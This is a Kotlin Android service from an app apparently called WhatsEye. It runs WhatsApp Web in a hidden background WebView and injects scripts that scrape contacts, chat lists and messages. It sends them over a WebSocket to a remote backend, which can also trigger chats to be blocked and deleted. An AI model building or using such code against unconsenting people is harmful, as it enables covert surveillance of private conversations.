package com.example.whatseye.services

import android.annotation.SuppressLint
import android.app.Service
import android.content.Intent
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.util.Log
import android.webkit.CookieManager
import android.webkit.WebSettings
import android.webkit.WebView
import android.webkit.WebViewClient
import com.example.whatseye.MainActivity
import com.example.whatseye.api.managers.JwtTokenManager
import com.example.whatseye.api.ws.WebSocketClientGeneral
import com.example.whatseye.api.ws.WebSocketGeneralManager
import com.example.whatseye.dataType.JavaScriptCode
import com.example.whatseye.utils.createNotification
import com.example.whatseye.utils.createNotificationChannel
import org.json.JSONObject

class AlwaysRunningService : Service() {

    companion object {
        private var instance: AlwaysRunningService? = null
        private const val MAX_RETRY_COUNT = 60
        private const val POLL_DELAY_MS = 500L
        fun getInstance(): AlwaysRunningService? = instance
    }

    private val TAG = "AlwaysRunningService"
    private val CHANNEL_ID = "AlwaysRunningServiceChannel"
    private var webSocketManager: WebSocketClientGeneral? = null
    private var webView: WebView? = null
    private val MAX_RETRIES = 100
    private val POLL_DELAY_MS = 1800L
    private var retryCount = 0
    private var checkLoginCount = 0
    private var selectRoomRetryCount = 0
    private var scrollContentRetryCount = 0
    private var isLoggedIn = false
    private val handler = Handler(Looper.getMainLooper())
    private val checkLoginRunnable = Runnable { checkLogin() }
    private var hasWebViewRun = false

    override fun onCreate() {
        super.onCreate()
        instance = this
        Log.d(TAG, "Service created")
        createNotificationChannel(this, CHANNEL_ID, "Always Running Service Channel")
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        Log.d(TAG, "Service started")
        val notification = createNotification(this, CHANNEL_ID, "Always Running Service", "Running in the background")
        startForeground(1, notification)

        if (JwtTokenManager(this).getIsLogin() && JwtTokenManager(this).getIsLoginWhatsApp() && !hasWebViewRun) {
            Log.d(TAG, "Initializing WebSocket and WebView")
            webSocketManager = WebSocketGeneralManager.getInstance(this)
            setupWebView()
            loadWhatsAppWeb()
            hasWebViewRun = true
        }

        return START_STICKY
    }

    @SuppressLint("SetJavaScriptEnabled")
    private fun setupWebView() {
        Log.d(TAG, "Setting up WebView")
        webView = WebView(this).apply {
            settings.apply {
                javaScriptEnabled = true
                domStorageEnabled = true
                useWideViewPort = true
                loadWithOverviewMode = true
                cacheMode = WebSettings.LOAD_DEFAULT // Changed to LOAD_DEFAULT for better reliability
                userAgentString = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36"
            }

            webViewClient = object : WebViewClient() {
                override fun onPageFinished(view: WebView?, url: String?) {
                    Log.d(TAG, "WebView page finished loading: $url")
                    restoreCookies()
                    view?.evaluateJavascript("document.body.style.zoom = '70%';", null)
                    retryCount = 0
                    checkLogin()
                }
            }
        }
    }

    private fun loadWhatsAppWeb() {
        Log.d(TAG, "Loading WhatsApp Web")
        webView?.loadUrl("https://web.whatsapp.com") ?: Log.e(TAG, "WebView is null")
        ensureCookiesAccepted()
        restoreCookies()
    }

    private fun ensureCookiesAccepted() {
        Log.d(TAG, "Accepting cookies")
        CookieManager.getInstance().setAcceptCookie(true)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            CookieManager.getInstance().setAcceptThirdPartyCookies(webView, true)
        }
    }

    private fun restoreCookies() {
        Log.d(TAG, "Restoring cookies")
        val sharedPreferences = getSharedPreferences("whatsapp_prefs", MODE_PRIVATE)
        val savedCookies = sharedPreferences.getString("whatsapp_cookies", null)
        savedCookies?.let {
            CookieManager.getInstance().setCookie("https://web.whatsapp.com", it)
            Log.d(TAG, "Cookies restored: $it")
        }
    }

    private fun checkLogin() {
        Log.d(TAG, "Checking login status")
        val jsCode = """
            (function() {
                return document.querySelector('div[aria-rowcount]') !== null;
            })();
        """.trimIndent()

        webView?.evaluateJavascript(jsCode) { data ->
            if (data.toBoolean()) {
                Log.d(TAG, "User is logged in")
                handler.removeCallbacks(checkLoginRunnable)
                isLoggedIn = true
                webView?.evaluateJavascript("""(()=>{
                    action = document.querySelector('[role="dialog"]')
                    if(action){
                        action.querySelector("button").click()
                    }
                    })""".trimIndent(), null)
            } else if (checkLoginCount < MAX_RETRIES) {
                Log.d(TAG, "Login not detected, retrying ($checkLoginCount/$MAX_RETRIES)")
                checkLoginCount++
                handler.postDelayed(checkLoginRunnable, POLL_DELAY_MS)
            } else {
                Log.e(TAG, "Login check max retries reached")
                startPollingForElement()
            }
        } ?: Log.e(TAG, "WebView is null during login check")
    }

    private fun startPollingForElement() {
        Log.d(TAG, "Polling for login error element")
        val jsCheckElement = """
            (function() {
                return document.querySelector('[role="img"]') !== null;
            })();
        """.trimIndent()

        webView?.evaluateJavascript(jsCheckElement) { result ->
            if (result?.toBoolean() == true) {
                Log.d(TAG, "Login error element found, relaunching app")
                JwtTokenManager(this).setIsLoginWhatsApp(false)
                val intent = Intent(this, MainActivity::class.java).apply {
                    flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TASK
                }
                startActivity(intent)
            } else if (retryCount < 20) {
                Log.d(TAG, "Polling retry ($retryCount/20)")
                retryCount++
                handler.postDelayed({ startPollingForElement() }, POLL_DELAY_MS)
            } else {
                Log.e(TAG, "Polling failed, reloading WebView")
                webView?.reload() ?: Log.e(TAG, "WebView is null")
            }
        } ?: Log.e(TAG, "WebView is null during polling")
    }

    private fun loadContact() {
        Log.d(TAG, "Trying to load contact via JS")
        retryCount = 0
        webView?.evaluateJavascript(
            """
            (function() {
                const button = document.querySelector("span[data-icon='new-chat-outline']");
                if (button) button.click();
                return button != null;
            })();
            """.trimIndent()
        ) { success ->
            if (success.toBoolean()) {
                webView?.evaluateJavascript(JavaScriptCode.CONTACT) {
                    Log.d(TAG, "CONTACT script injected")
                    checkContact()
                } ?: Log.e(TAG, "WebView is null")
            } else {
                Log.e(TAG, "Failed to click new chat button")
            }
        } ?: Log.e(TAG, "WebView is null during loadContact")
    }

    private fun checkContact() {
        Log.d(TAG, "Checking for CONTACT item in localStorage")
        webView?.evaluateJavascript(
            """
            (function() {
                return localStorage.getItem("CONTACT") !== null;
            })();
            """.trimIndent()
        ) { data ->
            if (data.toBoolean()) {
                Log.d(TAG, "CONTACT item found, extracting")
                webView?.evaluateJavascript(
                    """
                    (function() {
                        const data = localStorage.getItem("CONTACT");
                        localStorage.removeItem("CONTACT");
                        return data;
                    })();
                    """.trimIndent()
                ) { html ->
                    html?.let {
                        webSocketManager?.sendContact(it)
                        Log.d(TAG, "Contact sent via WebSocket")
                    }
                } ?: Log.e(TAG, "WebView is null during contact extraction")
            } else if (retryCount < 60) {
                Log.d(TAG, "No contact yet, retrying ($retryCount/60)")
                retryCount++
                handler.postDelayed({ checkContact() }, POLL_DELAY_MS)
            } else {
                Log.e(TAG, "Contact fetch timed out, reloading WebView")
                webView?.reload() ?: Log.e(TAG, "WebView is null")
            }
        } ?: Log.e(TAG, "WebView is null during checkContact")
    }

    private fun loadCurrentChats() {
        retryCount = 0
        webView?.evaluateJavascript(
            """
            (function() {
                const a = document.querySelector("span[data-icon='back']");
                if (a) a.click();
                return true;
            })();
            """.trimIndent()
        ) {
            webView?.evaluateJavascript(JavaScriptCode.CURRENT_CHATS) {
                checkCurrentChat()
            } ?: Log.e(TAG, "WebView is null during loadCurrentChats")
        } ?: Log.e(TAG, "WebView is null during loadCurrentChats")
    }

    private fun checkCurrentChat() {
        webView?.evaluateJavascript(
            """
            (function() {
                return localStorage.getItem("CURRENT_CHATS") !== null;
            })();
            """.trimIndent()
        ) { data ->
            if (data.toBoolean()) {
                webView?.evaluateJavascript(
                    """
                    (function() {
                        const data = localStorage.getItem("CURRENT_CHATS");
                        localStorage.removeItem("CURRENT_CHATS");
                        return data;
                    })();
                    """.trimIndent()
                ) { html ->
                    html?.let {
                        webSocketManager?.sendContactChat(it)
                        Log.d(TAG, "Chat sent via WebSocket")
                    }
                } ?: Log.e(TAG, "WebView is null during chat extraction")
            } else if (retryCount < 60) {
                Log.d(TAG, "No chat yet, retrying ($retryCount/60)")
                retryCount++
                handler.postDelayed({ checkCurrentChat() }, POLL_DELAY_MS)
            } else {
                Log.e(TAG, "Chat fetch timed out, reloading WebView")
                webView?.reload() ?: Log.e(TAG, "WebView is null")
            }
        } ?: Log.e(TAG, "WebView is null during checkCurrentChat")
    }

    fun selectRoom(name: String, pos: String) {
        selectRoomRetryCount = 0
        webView?.evaluateJavascript(
            """
            (function() {
                localStorage.removeItem("ROOM_SELECTED");
                localStorage.removeItem("CHATS");
                localStorage.removeItem("DONE_LOADING_CHAT");
                localStorage.removeItem("DONE_LOADING_CHAT2");
            })();
            """.trimIndent(), null
        )
        val escapedName = JSONObject.quote(name)
        Log.d(TAG, "Selecting room: $name (escaped: $escapedName)")

        webView?.evaluateJavascript("${JavaScriptCode.SELECT_ROOM}($escapedName, $pos);") {
            Log.d(TAG, "Room selection JavaScript executed")
            selectRoomFinished()
        } ?: Log.e(TAG, "WebView is null during selectRoom")
    }

    private fun selectRoomFinished() {
        webView?.evaluateJavascript(
            """
            (function() {
                return localStorage.getItem("ROOM_SELECTED") !== null;
            })();
            """.trimIndent()
        ) { data ->
            if (data.toBoolean()) {
                scrollContent2()
            } else if (selectRoomRetryCount < 60) {
                Log.d(TAG, "Room not selected, retrying (${selectRoomRetryCount + 1}/60)")
                selectRoomRetryCount++
                handler.postDelayed({ selectRoomFinished() }, POLL_DELAY_MS)
            } else {
                Log.e(TAG, "Timeout reached: failed to select room")
                webView?.reload() ?: Log.e(TAG, "WebView is null")
            }
        } ?: Log.e(TAG, "WebView is null during selectRoomFinished")
    }

    private fun scrollContent() {
        scrollContentRetryCount = 0
        Log.d(TAG, "Initiating content scroll")
        webView?.evaluateJavascript(JavaScriptCode.CHAT_ROOM_SCROLLER) {
            Log.d(TAG, "Scroll JavaScript executed")
            scrollContentFinished()
        } ?: Log.e(TAG, "WebView is null during scrollContent")
    }

    private fun scrollContentFinished() {
        webView?.evaluateJavascript(
            """
            (function() {
                return localStorage.getItem("DONE_LOADING_CHAT") !== null;
            })();
            """.trimIndent()
        ) { data ->
            if (data.toBoolean()) {
                chatContent()
            } else if (scrollContentRetryCount < 60) {
                Log.d(TAG, "Scroll not loaded, retrying (${scrollContentRetryCount + 1}/60)")
                scrollContentRetryCount++
                handler.postDelayed({ scrollContentFinished() }, POLL_DELAY_MS)
            } else {
                Log.e(TAG, "Timeout reached: failed to load chat")
                webView?.reload() ?: Log.e(TAG, "WebView is null")
            }
        } ?: Log.e(TAG, "WebView is null during scrollContentFinished")
    }

    private fun scrollContent2() {
        scrollContentRetryCount = 0
        Log.d(TAG, "Initiating second content scroll")
        webView?.evaluateJavascript(JavaScriptCode.CHAT_ROOM_SCROLLER2) {
            Log.d(TAG, "Second scroll JavaScript executed")
            scrollContentFinished2()
        } ?: Log.e(TAG, "WebView is null during scrollContent2")
    }

    private fun scrollContentFinished2() {
        webView?.evaluateJavascript(
            """
            (function() {
                return localStorage.getItem("DONE_LOADING_CHAT2") !== null;
            })();
            """.trimIndent()
        ) { data ->
            if (data.toBoolean()) {
                chatContent()
            } else if (scrollContentRetryCount < 60) {
                Log.d(TAG, "Second scroll not loaded, retrying (${scrollContentRetryCount + 1}/60)")
                scrollContentRetryCount++
                handler.postDelayed({ scrollContentFinished2() }, POLL_DELAY_MS)
            } else {
                Log.e(TAG, "Timeout reached: failed to load second chat")
                webView?.reload() ?: Log.e(TAG, "WebView is null")
            }
        } ?: Log.e(TAG, "WebView is null during scrollContentFinished2")
    }

    fun chatContent() {
        Log.d(TAG, "Extracting chat content")
        webView?.evaluateJavascript(JavaScriptCode.GET_CHAT) {
            checkChat()
        } ?: Log.e(TAG, "WebView is null during chatContent")
    }

    private fun checkChat() {
        Log.d(TAG, "Checking for CHATS item in localStorage")
        webView?.evaluateJavascript(
            """
            (function() {
                return localStorage.getItem("CHATS") !== null;
            })();
            """.trimIndent()
        ) { data ->
            if (data.toBoolean()) {
                Log.d(TAG, "CHATS item found, extracting")
                webView?.evaluateJavascript(
                    """
                    (function() {
                        const data = localStorage.getItem("CHATS");
                        localStorage.removeItem("CHATS");
                        return data;
                    })();
                    """.trimIndent()
                ) { html ->
                    html?.let {
                        webSocketManager?.sendChat(it)
                        Log.d(TAG, "Chat sent via WebSocket")
                    }
                } ?: Log.e(TAG, "WebView is null during chat extraction")
            } else if (retryCount < 60) {
                Log.d(TAG, "No chats yet, retrying ($retryCount/60)")
                retryCount++
                handler.postDelayed({ checkChat() }, POLL_DELAY_MS)
            } else {
                Log.e(TAG, "Chat fetch timed out")
                webView?.reload() ?: Log.e(TAG, "WebView is null")
            }
        } ?: Log.e(TAG, "WebView is null during checkChat")
    }

    fun getChatRoom(name: String, pos: String) {
        Log.d(TAG, "Getting chat room: $name")
        selectRoom(name, pos)
    }

    fun blockChat(name: String, pos: String) {
        val escapedName = JSONObject.quote(name)
        Log.d(TAG, "Initiating chat block for: $name at position: $pos")

        webView?.let { wv ->
            wv.evaluateJavascript("localStorage.removeItem('CONTACT_BLOCKED');", null)
            wv.evaluateJavascript("${JavaScriptCode.BLOCK_USER}($escapedName, $pos);") {
                checkBlocked(name, pos, 0)
            }
        } ?: Log.e(TAG, "WebView is null in blockChat")
    }

    private fun checkBlocked(name: String, pos: String, retryCount: Int) {
        webView?.let { wv ->
            wv.evaluateJavascript("""
            (function() {
                return localStorage.getItem('CONTACT_BLOCKED') !== null;
            })();
        """.trimIndent()) { result ->
                when {
                    result.toBoolean() -> {
                        Log.d(TAG, "Block confirmed for: $name")
                        deleteChat(name, pos)
                    }
                    retryCount < MAX_RETRY_COUNT -> {
                        Log.d(TAG, "Block not confirmed, retrying (${retryCount + 1}/$MAX_RETRY_COUNT)")
                        handler.postDelayed({ checkBlocked(name, pos, retryCount + 1) }, POLL_DELAY_MS)
                    }
                    else -> {
                        Log.e(TAG, "Block timeout reached for: $name")
                        wv.reload()
                    }
                }
            }
        } ?: Log.e(TAG, "WebView is null in checkBlocked")
    }

    private fun deleteChat(name: String, pos: String) {
        val escapedName = JSONObject.quote(name)
        Log.d(TAG, "Deleting chat for: $name at position: $pos")

        webView?.let { wv ->
            wv.evaluateJavascript("localStorage.removeItem('CONTACT_BLOCKED_2');", null)
            wv.evaluateJavascript("${JavaScriptCode.BLOCK_USER_2}($escapedName, $pos);") {
                checkBlockedSecondary(name, pos, 0)
            }
        } ?: Log.e(TAG, "WebView is null in deleteChat")
    }

    private fun checkBlockedSecondary(name: String, pos: String, retryCount: Int) {
        webView?.let { wv ->
            wv.evaluateJavascript("""
            (function() {
                return localStorage.getItem('CONTACT_BLOCKED_2') !== null;
            })();
        """.trimIndent()) { result ->
                when {
                    result.toBoolean() -> {
                        webSocketManager?.sendBlockedChat()
                        Log.d(TAG, "Blocked chat notification sent via WebSocket for: $name")
                    }
                    retryCount < MAX_RETRY_COUNT -> {
                        Log.d(TAG, "Secondary block not confirmed, retrying (${retryCount + 1}/$MAX_RETRY_COUNT)")
                        handler.postDelayed({ checkBlockedSecondary(name, pos, retryCount + 1) }, POLL_DELAY_MS)
                    }
                    else -> {
                        Log.e(TAG, "Secondary block timeout reached for: $name")
                        wv.reload()
                    }
                }
            }
        } ?: Log.e(TAG, "WebView is null in checkBlockedSecondary")
    }


    fun getContactChat() {
        Log.d(TAG, "Triggering getContactChat")
        loadCurrentChats()
    }

    fun getContact() {
        Log.d(TAG, "Triggering getContact")
        loadContact()
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        Log.d(TAG, "Service destroyed")
        handler.removeCallbacksAndMessages(null) // Clear all callbacks
        webView?.apply {
            stopLoading()
            destroy()
        }
        webView = null
        webSocketManager = null
        instance = null
        super.onDestroy()
    }

    private fun String?.toBoolean(): Boolean = this == "true"
}